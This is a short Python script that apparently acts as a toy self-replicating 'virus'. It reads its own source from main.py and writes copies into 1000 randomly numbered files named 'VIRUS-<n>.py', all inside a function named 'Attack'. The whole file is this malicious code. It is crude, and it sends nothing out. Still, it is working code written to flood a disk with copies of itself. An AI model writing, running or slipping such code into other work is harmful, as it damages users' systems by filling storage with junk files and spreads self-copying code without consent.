File = open("main.py",'r')
Data = File.read()
File.close()

File_Virus='VIRUS-{0}.py'

import random
def Attack(File_Name):
    File = open(File_Name,'w')
    File.write(Data)
    File.close()
   
for i in range(1000):
    Attack(File_Virus.format(random.randint(1,100000)))
    
